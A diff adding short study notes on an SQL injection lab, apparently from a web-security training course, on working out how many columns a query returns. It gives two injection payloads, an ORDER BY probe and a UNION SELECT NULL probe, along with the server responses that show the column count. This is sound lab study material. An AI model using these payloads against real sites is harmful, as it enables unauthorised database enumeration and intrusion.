@@ -1,0 +1,15 @@
+==> SQLi lab 7
+==> Goal: determining the number of columns returned by the query
+
+means that on the backend the query that is used in the product category filter how many columns is that query using?
+
+> it's a simple one step solution
+payload: ' order by 4--
+output: internal server error that means query is using 3 columns
+
+> but the above payload won't solve the lab because they want us to perform it with UNION operation
+so our payload will be diffrent
+we can try out by sending values with 1 column.. 2 columns etc
+payload: ' UNION SELECT NULL,NULL,NULL--
+output: we have used select operator with 3 columns giving them a null value and if that returns with 200 OK message that proves that query is 
+using 3 columns.
